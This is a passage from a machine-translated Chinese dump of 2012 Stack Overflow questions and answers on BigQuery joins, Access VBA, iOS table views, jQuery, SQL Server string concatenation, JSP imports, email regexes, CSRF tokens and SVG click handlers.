        "projectId": "citrius-altrius-fortius", 
        "tableId": "anonba898655_04dc_4d8d_8c29_673a36ba4c9f", 
        "datasetId": "_6fff29df40f86299d525686858be44df27c8dfd0"
      }
    }
  }, 
  "id": "citrius-altrius-fortius:job_e870b1fe67b94897a157dfa4f60b9725", 
  "selfLink": "https://www.googleapis.com/bigquery/v2/projects/citrius-altrius-fortius/jobs/job_e870b1fe67b94897a157dfa4f60b9725"
} 
```

**title**和**id**是纯字符串列（不重复）。两个表的大小都相当小（在连接右侧添加限制 1000 不会改变任何内容）。但是，当我更改查询以仅使用一个表时：

```
SELECT data_table.title AS name
FROM
  ( 
    SELECT id, title
    FROM
    [citrius-altrius-fortius:analyze.topic_735_1354233600]
  ) AS  data_table
  INNER JOIN
  ( 
    SELECT id FROM
    [citrius-altrius-fortius:analyze.topic_735_1354233600]
    WHERE
    UPPER(title) CONTAINS ("BUDGET") LIMIT 1000
  ) AS filter_table
ON data_table.id == filter_table.id 
```

它每次都有效。在它们（子选择）从多个表中选择的地方连接两个子选择的正确方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T18:45:03.717

您在连接中遇到了一个已知的错误： [BigQuery - JOIN 左侧的 UNION == Unexpected。请再试一次](https://stackoverflow.com/questions/13222309/bigquery-union-on-left-side-of-join-unexpected-please-try-again)

我们正在积极进行修复。

# ms-access - 我的文本框没有显示来自我的组合框选择的数据

> ID：13756394
> 
> 赞同：0
> 
> 时间：2012-12-07T03:15:55.970
> 
> 标签：ms-access, combobox, textbox, vba

这是我的桌子

```
软件
-----------------
ID（自动编号）
产品名称（文字）
许可证总数（个）

```

我正在使用 microsoft office access 2007，并且正在创建一个表单来显示上述字段。

我想根据在 ProductName 字段中选择不同数据的组合框中的更改来显示总许可字段中的数据。

```
Textbox ID = TbTotalLicense
ComboBox ID = CbProductName 
```

我的组合框正在查询中运行

```
SELECT Employee.EmpName, Employee.EmpCode, Employee.CompanyID, Employee.DeptID,
       Employee.ComputerID, Software.ProductName
FROM
    Software
    INNER JOIN ((Computer
    INNER JOIN Employee ON Computer.CompID=Employee.ComputerID)
    INNER JOIN Application ON Computer.ComputerName=Application.[A-ComputerID])
    ON Software.ID=Application.SoftwareID
WHERE (((Application.SoftwareID) = [Forms]![Form2]![CbProductName])); 
```

```
Private Sub CbProductName_AfterUpdate()
    Me!Softwareuserlist.Form.Requery
    Me!TbNoOfLicense.Requery
    Me!TbRemainingNoOfLicense.Requery
    Me!TbTotalLicense.Requery
End Sub

Private Sub CbProductName_Change()
    Me!TbTotalLicense = Me!CbProductName.Column(3)
End Sub 
```

这是我的代码，但我不断收到错误，它一直告诉我调试，它甚至不会在我运行时在文本框中显示数据。我的其他文本框工作正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T14:01:07.223

好吧，如果它告诉您调试，那么调试！

查看问题发生在哪个代码行。打开本地窗口（菜单`View`> `Locals Window`）并检查相关变量、控件等的值。

您还可以使用 Ctrl-G 打开即时窗口并键入要打印的表达式

```
?Me!CbProductName.Column(3) 
```

这 ”？” 是一个捷径`Debug.Print`

您还可以设置断点。单击代码行左侧的灰色条以设置断点。运行代码。它将停在那条线上，让您可以按照上面的说明检查变量。

请参阅：
- [ACC：调试 Access Basic 代码的](http://support.microsoft.com/kb/108438)
提示 - [Microsoft Access、VBA 和 Visual Basic 6 (VB6) 的错误处理和调试提示和技术](http://www.fmsinc.com/tpapers/vbacode/debug.asp)

# ios - 为什么我的 Grouped tableView 的 cell.backgroundView 为零

> ID：13756396
> 
> 赞同：1
> 
> 时间：2012-12-07T03:16:19.637
> 
> 标签：ios, uitableview

这是我的代码，非常示例。

```
- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code

        self.backgroundColor = [UIColor clearColor];

        _userView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 320, 40)];

        _userView.backgroundColor = [UIColor grayColor];

        [self addSubview:_userView];

        _tableView = [[UITableView alloc] initWithFrame:CGRectMake(0, 40, 320, 420) style:UITableViewStyleGrouped];

        _tableView.backgroundColor = [UIColor whiteColor];

        _tableView.delegate = self;
        _tableView.dataSource = self;

        [self addSubview:_tableView];

//        _tableView.separatorStyle = UITableViewCellSeparatorStyleSingleLine;

    }
    return self;
}

-(NSInteger)numberOfSectionsInTableView:(UITableView*)tableView
{
    return 3;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{

    return 2;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

    UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"aaa"];

    if (!cell.backgroundView) {
        NSLog(@"wrong");
    }

    return cell;
} 
```

我的表是分组的，Apple 的文档说： cell.background ： // UITableViewStylePlain 中的单元格默认为 nil，UITableViewStyleGrouped 的默认值为非 nil。'backgroundView' 将被添加为所有其他视图后面的子视图。

但我的 cell.backgroundView = nil。

任何人都可以帮助，谢谢。

# jquery - 如何将下拉菜单中的选项添加到选择框中？

> ID：13756397
> 
> 赞同：1
> 
> 时间：2012-12-07T03:16:26.923
> 
> 标签：jquery

我在下面有一个 jquery 代码，其中从下拉菜单中删除了从下拉菜单中选择的选项：

```
 var selectedOption = jQuery("#modulesDrop option:selected");
            selectedOption.remove(); 
```

但是在执行删除之前，我想将下拉菜单中的内容添加到选择框中，但问题是我似乎不知道如何执行此操作。我尝试了下面的代码，但所做的只是从上面的下拉菜单中删除了该选项，并且没有将选项添加到选择框中：

```
 var selectedOption = jQuery("#modulesDrop option:selected");
        selectedOption.appendTo("#moduleExistForm");
        selectedOption.remove(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:19:42.477

```
 var selectedOption = jQuery("#modulesDrop option:selected");
 var appendedObject = '<div>Something</div>';
 selectedOption.before(appendedObject);
 selectedOption.remove(); 
```

.append() 方法将指定的内容作为最后一个子项插入因此，如果您选择了对象，请使用 before 或 after 方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T03:21:51.287

摆脱 .remove()。通过使用 appendTo()，您可以将该元素从其当前位置移动到新位置。

如果您只想移动内容，则将值保存到变量并附加它。

```
var selectedOption = jQuery("#modulesDrop option:selected"),
    selectedOptionValue = selectedOption.val();
selectedOptionValue.appendTo("#moduleExistForm");
selectedOption.remove(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T03:24:43.323

您不需要调用`remove()`，因为`appendTo()`会自动将元素与其原始父元素分离，然后将其附加到您指定的新元素上：

```
<select id="old">
<option value="dog">dog</option>
<option value="cat">cat</option>
</select>

<input type="button" value="add" id="add"/>

<select id="new">
</select>​
<script>
   $('#add').click(function(){
     var x = $('#old option:selected');
     x.appendTo($('#new'))
    });​
</script> 
```

这是小提琴：http: [//jsfiddle.net/8MAny/](http://jsfiddle.net/8MAny/)

# sql - 从 SELECT 语句构建字符串

> ID：13756398
> 
> 赞同：1
> 
> 时间：2012-12-07T03:16:28.233
> 
> 标签：sql, sql-server-2008, sql-server-2008-r2

> **可能重复：**
> [具有不同字符的 SQL Server 组连接](https://stackoverflow.com/questions/13523272/sql-server-group-concat-with-different-characters)

我需要一个关于 SELECT 的示例，其中输出是“，”分隔的字符串

例如`SELECT (... something ...) name AS output FROM name_table`

给我

```
output
-----------------------------
'Ann', 'Tom', 'Wilson', ..... 
```

您将如何在 SQL Server 2008 R2 中做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T03:18:48.207

假设你有这样的模式，

```
CREATE TABLE Table1
    ([GROUP_ID] int, [PERSON_NAME] varchar(6));

INSERT INTO Table1
    ([GROUP_ID], [PERSON_NAME])
VALUES
    (1001, 'ALEX'),
    (1002, 'MATHEW'),
    (1001, 'GEORGE'),
    (1002, 'THOMAS'),
    (1001, 'JAMES'); 
```

创建一个类似这样的查询来产生一个逗号分隔的值，

```
SELECT
     GROUP_ID,
     STUFF(
         (SELECT ', ' + PERSON_NAME
          FROM Table1
          WHERE [GROUP_ID] = a.GROUP_ID
          FOR XML PATH (''))
          , 1, 1, '')  AS NamesList
FROM Table1 AS a
GROUP BY GROUP_ID 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!3/c3e7a/7)

# android - 对同一活动活动发出警报

> ID：13756405
> 
> 赞同：1
> 
> 时间：2012-12-07T03:17:06.250
> 
> 标签：android, android-intent

我设置了一个闹钟来开始一项活动，比如说 A。

如果预期的 A 活动不在前台，A 将醒来并点击 onResume()，我会在其中查看它的来源。

但是如果 A 在前台，我的意图会发生什么？

谢谢 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:28:54.273

这将取决于如何为活动[A](http://developer.android.com/guide/topics/manifest/activity-element.html#lmode)定义启动模式。例如，如果它设置为标准：

```
<activity android:name=".Activity" android:launchMode="Standard"> 
```

当意图被触发时，它将产生第二个活动，并产生与意图一样多的活动，如果它设置为“singleTop”：

```
<activity android:name=".Activity" android:launchMode="singleTop"> 
```

它只会将意图路由到已经运行的活动实例。还有两种类型：“singleInstance”和“singleTask”，因此请参阅文档了解更多详细信息，以便根据需要进行自定义。

# iphone - 苹果认证后，有什么方法可以在itunesconnection上测试未发布的构建？

> ID：13756408
> 
> 赞同：2
> 
> 时间：2012-12-07T03:17:14.253
> 
> 标签：iphone, ios, distribution, app-store-connect

Apple 认证后，有什么方法可以在 itunesconnect 上测试未发布的构建？

以下文章显示了如何获取未发布的应用程序，但仅适用于第一个版本“是否可以获得尚未批准的应用程序的应用程序链接？（http://www.cocos2d-iphone.org/forum/topic/ 10044)"

但是我的问题是Apple Store上已经有一些旧版本了，我刚刚提交了一个新版本，这个版本通过了Apple证书但还没有发布。由于担心是在我发布它之后，此版本上发生的任何问题都不可恢复。（在 Apple 证书和加密之后，有时应用程序的执行与您的调试版本不完全一样，我只是从这个问题中遭受了很多痛苦，这就是为什么我想检查真正的最终版本）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:50:49.650

我不确定，但我认为有一种方法可以通过使用促销代码兑换应用程序来做到这一点。Apple 允许这样做，因此您可以在发布之前将其发送给测试人员和应用审阅者。

# java - 为什么我的 IDE 不能识别我认为我已正确导入到 JSP 中的这种类型？

> ID：13756410
> 
> 赞同：0
> 
> 时间：2012-12-07T03:17:19.900
> 
> 标签：java, jsp, servlets, rss, rome

这让我发疯，我已经[在这里](https://stackoverflow.com/questions/1719824/how-to-reference-an-external-jar-in-jsp-app)和[这里](https://stackoverflow.com/questions/1858463/java-error-only-a-type-can-be-imported-xyz-resolves-to-a-package)寻求以前的答案，但到目前为止无济于事。

我正在尝试遵循[本](http://cse.csusb.edu/turner/java_web_programming/news_feed_app/)教程，该教程使用 RSS 提要的罗马库来使用 servlet 将提要条目输出到 JSP。我正在使用 Eclipse，即使我已将 JAR 放在项目的构建路径和 WEB-INF/lib 文件夹中，它也无法识别来自罗马的“SyndFeed”类。仍然为以下代码显示“未定义类型”：

```
<jsp:useBean id="syndFeed" scope="request" type="SyndFeed" /> 
```

在此之上，我有：

```
<%@ page import="com.sun.syndication.feed.synd.SyndFeed" %> 
<%@ page import="com.sun.syndication.feed.synd.SyndEntry" %> 
<%@ page import="java.util.Iterator" %> 
```

我使用 Rome 的 servlet 基本上直接来自本教程：

```
public class RssServlet1 extends HttpServlet {
    private static final long serialVersionUID = 1L;

    private RequestDispatcher indexJSP;

    @Override
    public void init(ServletConfig config) throws ServletException {
        ServletContext context = config.getServletContext();
        indexJSP = context.getRequestDispatcher("/WebContent/index.jsp");
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {

        URL feedURL = new URL("http://rss.cnn.com/rss/cnn_tech.rss");
        SyndFeedInput syndInput = new SyndFeedInput();
        SyndFeed syndFeed = null;
        XmlReader xmlReader = new XmlReader( feedURL );

        try {
            syndFeed = syndInput.build( xmlReader );
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        } catch (FeedException e) {
            e.printStackTrace();
        }

        request.setAttribute("syndFeed", syndFeed);
        indexJSP.forward(request, response);

    }

} 
```

servlet 没有显示编译错误。所有导入都可以，包括 from `com.sun.syndication.feed.synd.SyndFeed`。

我不知所措。在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T03:39:49.947

的`class`and`type`属性`jsp:useBean`（这两个属性意味着不同的东西；确保您使用正确的一个来满足您的需要）期望完全限定的类名。采用：

```
<jsp:useBean id="syndFeed" scope="request" type="com.sun.syndication.feed.synd.SyndFeed" /> 
```

# silverlight - 在 Silverlight URL 中传递参数

> ID：13756414
> 
> 赞同：1
> 
> 时间：2012-12-07T03:17:32.037
> 
> 标签：silverlight, ria, silverlight-5.0

我开发了一个 Silverlight RIA 应用程序。假设站点链接`http://MySilverlightApp` 在我的 main.xaml 页面中，我导航到不同的视图（例如 Page1）。所以当我去的时候，`http://MySilverlightApp`我会被路由到`http://MySilverlightApp/#/Page1`

在这个 Page1.xaml 中，我显示了一个单选按钮列表。每个单选按钮都有一个 ID，选择单选按钮后，我会在页面上显示更多内容。

我想从 url 本身传递该 ID，例如`http://MySilverlightApp/#/Page1?ID=13`

然后，当我的页面加载时，我可以获取该 ID 并选择单选按钮（ID 为 13）并在此处显示材料。

我怎样才能做到这一点？我想不是在后面的代码中而是在 Page1 视图模型中获取字符串。（不绑定，只是想检索值）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-08T09:16:24.733

好的，这就是我所做的。

在我后面的代码中，我引入了一个属性来查询并找出是否传递了任何参数。

```
private string ParamValue
        {
            get
            {
                string paramValue = "";
                const string paramName = "ID";

                if (NavigationContext.QueryString.ContainsKey(paramName))
                    paramValue = NavigationContext.QueryString[paramName];

                return paramValue;
            }
        } 
```

在我的 Loaded Event 处理程序中，我调用视图模型的公共方法并传入 ID。就像是

```
private void Page1_Loaded(object sender, RoutedEventArgs e)
        {
            if (!String.IsNullOrEmpty(ParamValue))
            {
                Page1iewModel page1ViewModel = this.DataContext as Page1ViewModel ;
                page1ViewModel.SetID(ParamValue);
            }
        } 
```

# php - CSRF 风险和代币

> ID：13756427
> 
> 赞同：0
> 
> 时间：2012-12-07T03:18:57.537
> 
> 标签：php, jquery, json, jsonp, csrf

我有一个书签，可以将表单注入到另一台服务器的网页中。此表单使用 jQuery 通过 JSONP 将数据提交回我的服务器，并将提交的数据添加到数据库中。

**问题：**这个注入的表单还在隐藏字段中包含一个 CSRF 令牌：

```
<input type="hidden" name="csrf_token" value="MWkgtQbdH6maJhuGL7ObwPcbgqARUCTjb4NSdo29"> 
```

这仍然会带来 CSRF 风险吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:22:46.653

该页面仍然可以被远程抓取和提交。这是一种威慑，但不是绝对的解决方案。它会停止链接，但有人可以远程发布表单。

您也可以检查引荐来源网址，但某些客户端和防火墙会阻止发送引荐来源网址。

一种解决方案是在提交时通过 js 设置一个 cookie，然后验证该服务器端。

# javascript - 电子邮件验证javascript中的正则表达式

> ID：13756428
> 
> 赞同：0
> 
> 时间：2012-12-07T03:19:01.123
> 
> 标签：javascript, regex

我正在对电子邮件进行电子邮件正则表达式验证，如果用户输入类似的内容，我会使用以下表达式卡在一个点上，`abc.abc`然后这个表达式工作正常，但是当用户输入时`advxyz@pqr.com`，它就不起作用

```
var myreg = new RegExp(/([a-z0-9.]+)@([a-z0-9]+)\.([a-z0-9]+)/i);
var patter =  myreg.test(document.getElementById("email").value)
alert(patter)
if(patter == false){
  errorMsg.push("email Formate Error Ex:firstname.lastname@abc.com");
} 
```

我希望该用户必须以这种格式输入他的电子邮件，例如`firstname.lastname@abc.com/.ca/.org`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:37:29.757

```
var pattern = /^[a-z0-9]+\.[a-z0-9]+@[a-z0-9]+\.[a-z]+$/i;

pattern.test('firstname.lastname@abc.com');
// returns true;

pattern.test('jsmith@abc.com');
// returns false;

pattern.test("abc.abc");
// returns false; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:38:15.077

使用正则表达式可能是最好的方法。

这是一个示例（现场演示）：

```
function validateEmail(email) { 
  var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\ ".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(email);
} 
```

但请记住，不应仅依赖 JavaScript 验证。JavaScript 很容易被禁用。这也应该在服务器端进行验证。

[来源](https://stackoverflow.com/a/46181/1168379)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-16T10:52:30.637

这项工作非常适合我。

```
/^[a-zA-Z]([a-zA-Z0-9_\-])+([\.][a-zA-Z0-9_]+)*\@((([a-zA-Z0-9\-])+\.){1,2})([a-zA-Z0-9]{2,40})$/; 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-07T03:24:03.357

希望这有助于解决问题 \b[A-Z0-9._%-]+@[A-Z0-9.-]+.[AZ]{2,4}\b 它区分大小写。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-07-24T12:53:08.780

验证电子邮件地址的模式是：

/^([a-zA-Z0-9_.-])+\@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4} )+$/;

在正则表达式中使用此模式。你可以验证任何电子邮件..

# jquery - 正确的jquery代码格式

> ID：13756430
> 
> 赞同：0
> 
> 时间：2012-12-07T03:19:19.653
> 
> 标签：jquery, html

我想更正这种格式，但我不知道如何修复它。我只想将“标题”设置为 img 标签作为我的 html 输出中的文件名。

这是代码，所以请耐心等待这个输出。

```
var imgName = $bxNextImage.attr("title");
$title.text( '<img src='imgName' width='' height='' alt=''>' ); 
```

感谢可以帮助我的人..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:21:16.517

您可以同时使用 ' 和 " 引号：

```
var imgName = $bxNextImage.attr("title");
$title.html( '<img src="' + imgName + '" width="" height="" alt=""/>' ); 
```

我从更改为`.text()`，`.html()`因为`.text()`不会渲染图像对象，而只是纯文本。

# oracle - Crystal Report 设计文件到 BI 发布者模板

> ID：13756432
> 
> 赞同：0
> 
> 时间：2012-12-07T03:19:46.643
> 
> 标签：oracle, crystal-reports, bi-publisher

我目前正在将 Crystal Report 转换为 BI 发布者报告。

我想知道是否有办法将水晶 .rpt 设计文件直接转换为 word .rtf 模板？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-10-31T19:14:44.863

我认为没有工具可以将晶体转换为 BI 发布者。我们必须通过观察水晶从头开始构建它。当他们说将晶体转换为 BI 发布者时，这就是我一直在做的事情。

# jquery - 如何通过jquery创建网页预加载栏？

> ID：13756433
> 
> 赞同：1
> 
> 时间：2012-12-07T03:19:49.583
> 
> 标签：jquery

> **可能重复：**
> [如何创建 jQuery 加载栏？（就像在 Flash 网站上使用的一样）](https://stackoverflow.com/questions/8442363/how-to-create-a-jquery-loading-bar-like-the-ones-used-on-flash-sites)

我想在整个网页加载之前在页面上制作一个动画预加载栏，它应该等到整个网页完全加载，包括图像，媒体，脚本，css，ajax，div等，我怎么知道这些元素实际上是加载？

创建这样的加载栏的最佳方法是什么？在加载之前使用 div 覆盖所有元素？但我看到 div 会闪烁。

# haskell - 使用 cabal 配置文件中指定的扩展名启动 ghci

> ID：13756434
> 
> 赞同：1
> 
> 时间：2012-12-07T03:19:58.467
> 
> 标签：haskell, cabal, ghci

在我的 cabal 文件中，我启用了一堆语言扩展。假设我有

*   模板Haskell
*   准行情
*   CPP

有没有办法在这些自动启用的情况下启动 GHCi？而不是手动做

> `ghci -XTemplateHaskell -XQuasiQuotes -XCPP`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T03:27:59.733

是的，您可以使用 .ghci 文件。请参阅 GHC 手册中的第 2.9 节。

`~/.ghci`

`:set -XTemplateHaskell -XQuasiQuotes -XCPP`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-02T00:11:30.337

`cabal-ghci`正是我想要的。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-07T04:49:54.160

在源文件顶部的编译指示中指定扩展名：

```
{-# LANGUAGE TemplateHaskell, QuasiQuotes, CPP #-} 
```

对于不在语言编译指示范围内的 ghc 选项，您还可以使用 OPTIONS_GHC 编译指示（并且您可以编写`{-# OPTIONS_GHC -XTemplateHaskell -XQuasiQuotes -XCPP #-}`（注意缺少逗号），但在可能的情况下首选语言编译指示，因为它可以移植到其他编译器支持扩展）。

# c# - 在 .NET 的 MySQL 查询中使用 CONCAT

> ID：13756436
> 
> 赞同：3
> 
> 时间：2012-12-07T03:19:57.610
> 
> 标签：c#, mysql, concat

我正在编写一个 C# WPF 应用程序，其控件绑定到 MySQL 5.5 数据库。我正在`DataTable`使用 a填充一个`MySqlDataAdapter`，传入一个 MySQL SELECT 查询。

当查询是微不足道的事情时，比如`SELECT * FROM People`or `SELECT LastName, FirstName, PersonID FROM People`，一切都很好，我的`ListBox`控件最终填充了预期的名称。

但是，当查询包含一个相当简单的`CONCAT`运算符时，查询会默默地失败并且`ListBox`保持为空。特别是以下都没有工作，即使两者都可以在 MySQL 命令行中正常工作。

```
SELECT CONCAT(LastName, FirstName) as Name FROM People
SELECT CAST(CONCAT(LastName, FirstName) AS CHAR) as Name FROM People 
```

`LastName`和都`FirstName`定义为`VARCHAR`。所以，无论如何，我都不希望这是一个`CONCAT`返回二进制字符串的实例。我提到这一点是因为它似乎是其他人提到的类似问题的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:30:10.943

我想 DataAdapter 试图将您的查询解析为内部格式，以便它可以执行诸如生成更新和插入命令之类的事情。

你可以用 a`MySqlDataReader`来填充你的数据表吗？这可能仅在您不打算使用`DataTable`

从记忆中走...

```
MySqlCommand cmd = new MySqlCommand(query, connection);
MySqlDataReader reader = cmd.ExecuteReader();
DataTable dt = new DataTable();
dt.Load(reader); 
```

# animation - cocos2d中如何以指定角度播放动画？

> ID：13756438
> 
> 赞同：1
> 
> 时间：2012-12-07T03:20:15.093
> 
> 标签：animation, cocos2d-iphone, angle

我制作了这个动画，它是一只手臂从某个人的头顶移动到他身体的中心。手臂边缘到男孩身体中点的距离是一个圆的半径，所以无论男孩的手臂在他的右、左、上，这个距离都是完全一样的，另外，动画是无论手臂从哪个方向到中心，都完全相同。如果只有 4 个攻击方向，我知道我可以制作 4 个不同的动画，但在我的游戏中，手臂可以延伸的方向是无限的，因为用户滑动并且手臂朝那个确切的方向延伸。

无论手臂向哪个方向延伸，相同的动画只是在不同的角度工作（动画是在男孩的手臂直接在他的头上方制作的）。

我可以计算出手臂伸展的角度，但是如果你明白我的意思，我怎么能以这个角度播放动画？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:39:43.087

好吧，如果你设置动画的第一个精灵的旋转，整个帧数组都会倾斜，就像我的一个游戏中的这个例子：

```
CCAnimation *anim;
NSString *frameName;
NSString *animName;

anim = [self getAnimationFor:mapAnimationTypeIdle];
animName = [self getAnimationNameFor:mapAnimationTypeIdle];
frameName = [self getFrameNameForAnimationNamed:animName andFrame:1];
CCAction *forever = [CCRepeatForever actionWithAction:
                       [CCAnimate actionWithAnimation:anim]
                    ];
_soldierAnim = 
    [CCSprite spriteWithSpriteFrame:
       [[CCSpriteFrameCache sharedSpriteFrameCache] spriteFrameByName:frameName]
    ];
[self addChild:_soldierAnim z:0 tag:_tagForSoldierAnimation];
_soldierAnim.rotation=22;
[_soldierAnim runAction:forever]; 
```

我刚刚对此进行了测试，它将整个动画倾斜了 22 度。

# ios - iOS 角度右/左 3D 效果

> ID：13756440
> 
> 赞同：0
> 
> 时间：2012-12-07T03:21:09.867
> 
> 标签：ios, animation, core-animation

我正在寻找动画 UIView 并给它一些 3D 效果。

我已经尝试过，`CATransform3DMakeRotation()`但似乎无法获得正确的效果。

我想要实现的是这样的：

![在此处输入图像描述](../Images/272d4a562dd539c2c0e14f4ea8301b07.png)

红色视图以 3d 视角从一侧移动到另一侧。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:35:04.960

不是确切的答案，但可以为您指明正确的方向。[Tumbljack 有一个很好的教程、示例项目和](http://tumbljack.com/post/176535888/3d-objects-in-objective-c-with-catransformlayer)关于如何在视图上进行 3D 转换的视频。

您可以尝试使用其中提到的以下属性。

```
layer.transform = CATransform3DMakeRotation(radian, x, y, z); 
```

或者

```
transform.m34 = 1.0 / -zDistance; 
```

尝试调整示例代码以在`UIVIew`. 他的教程是有一个完整的 3D 立方体/球体转换，在您的情况下，您可能只需要左右移动。

# javascript - 如何让 onclick 处理嵌入的 SVG 图像

> ID：13756443
> 
> 赞同：2
> 
> 时间：2012-12-07T03:21:22.737
> 
> 标签：javascript, html, javascript-events

`<embed id="bottom" src="img/model/skirt.svg" onclick="control.colorClothes(this)" title="bottom" type="image/svg+xml" width="325" height="500"> </embed>`

我想在鼠标点击时触发一个事件。
如果我使用 onload 和 onmouseover，而不是 onclick 或 onmouseup/down，则上述方法有效。

有什么想法吗？

** 编辑 **

我感谢海报。我正在寻找的代码是
`onload="this.getSVGDocument().onclick = function(event){alert(333);};"`

它克服了三个不同的问题。

1.  加载 svg 文件的延迟导致尝试在尚不存在的 svg 文件上执行的代码出现问题。

2.  onclick 事件必须附加到 svg 元素。我不知道为什么，Tanzeels 的帖子显示了这一点，我的实验证实了这一点。

3.  我试图编写 onclick="alert(333)" 的方式不起作用。以上就是。同样，我不知道为什么，但在这一点上，我很高兴顺其自然。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T05:57:50.780

您需要将点击处理程序分配给 SVG。在以下几行做一些事情：

```
<!DOCTYPE html>
<html>
<head>
    <script type="text/javascript">
        function getClick(event) {
            var clickedElement = event.target;
            alert(clickedElement);
            //console.log(clickedElement);
            return;
        }

        function addClick() {
            var embedObj = document.getElementById("bottom");
            embedObj.getSVGDocument().onclick = function (event) {
                return getClick(event);
            };
            return;
        }
    </script>
</head>
<body onload="addClick();">
    <embed id="bottom" src="img/model/skirt.svg" title="bottom" type="image/svg+xml"
        width="628" height="709"></embed>
</body>
</html> 
```

将`event.target`返回被单击的 SVG 节点。

请注意，此方法*不适*用于跨域 SVG 资源，因为浏览器`permission denied`在分配`onclick`事件处理程序时会抛出错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:33:29.110

尝试将嵌入标签包装在 div 中并将 onclick 处理程序放在上面可能是值得的。我不确定点击事件是否会从 svgs 冒泡到正常的 DOM 中，但如果他们这样做了，那么你应该没问题。像这样：

```
<div onclick="control.colorClothes(this)"><embed id="bottom" src="img/model/skirt.svg" onclick="control.colorClothes(this)" title="bottom" type="image/svg+xml" width="325" height="500"></embed></div> 
```

# objective-c - 我应该为分组表放入 cellForRow 的单元格的大小是多少？

> ID：13756450
> 
> 赞同：-2
> 
> 时间：2012-12-07T03:22:31.270
> 
> 标签：objective-c, xcode4.5

**注意：**很明显，宽度是 300。我不完全确定，因为在我给一个宽度为 300 的单元格后，单元格被调整为 320。我问的原因是因为在一种情况下我给了 300，在另一种情况下我给了 320两者都工作正常。我想知道有没有官方的方法。

我不是在问分组单元格的单元格宽度是多少。我在问我应该提供的单元格的宽度是多少。我有时会毫无问题地发送 300 个宽度的单元格和 320 个单元格。

我使用 xib 并将 UITableViewCell 子类化。已经做过很多次了。有用。我只是好奇是否只有一些官方文档在分组时需要返回比 UITableViewCell 窄 20 点的 tableViewCell，因为我在任何地方都没有看到。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSUInteger row = [indexPath row];

    NearbyShortcutTableViewCell * cell;

    if([self.arrayOfItems[row] isNotEmpty]){
        cell=(NearbyShortcutTableViewCell *)self.arrayOfItems[row];
    }
    PO(cell);
    PO(cell.superview);
    PO(cell.superview.superview);
    return cell;
}

cell.superview.superview: (null)
     cell: <NearbyShortcutTableViewCell: 0x89a8300; baseClass = UITableViewCell;
 frame = (0 0; 300 50); layer = <CALayer: 0x89a8420>>
     cell.superview: (null)
     cell.superview.superview: (null)
     cell: <NearbyShortcutTableViewCell: 0x89a9030; baseClass = UITableViewCell; frame = (0 0; 300 50); layer = <CALayer: 0x89f3d60>>
     cell.superview: (null)
     cell.superview.superview: (null)
     cell: <NearbyShortcutTableViewCell: 0x8bbf5e0; baseClass = UITableViewCell; frame = (0 754; 320 50); autoresize = W; layer = <CALayer: 0x8bbf700>>
     cell.superview: (null)
     cell.superview.superview: (null)
     cell: <NearbyShortcutTableViewCell: 0x8bb48b0; baseClass = UITableViewCell; frame = (0 704; 320 50); autoresize = W; layer = <CALayer: 0x8bbe6d0>>
     cell.superview: (null)
     cell.superview.superview: (null)
     cell: <NearbyShortcutTableViewCell: 0x8bb4050; baseClass = UITableViewCell; 
frame = (0 654; 320 50); autoresize = W; layer = <CALayer: 0x8bbe2c0>> 
```

所以一开始我提供了一个 300 宽的单元格。不知何故，它被调整为 320。但是，一切仍然“很好”

实际上我应该提供一个 300 宽度的单元还是一个 320 宽度的单元？

似乎无论我提供的单元格大小，单元格本身都会调整为 tableViewCell 的宽度。我只是不想在调整大小时处理子视图布局。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:36:25.277

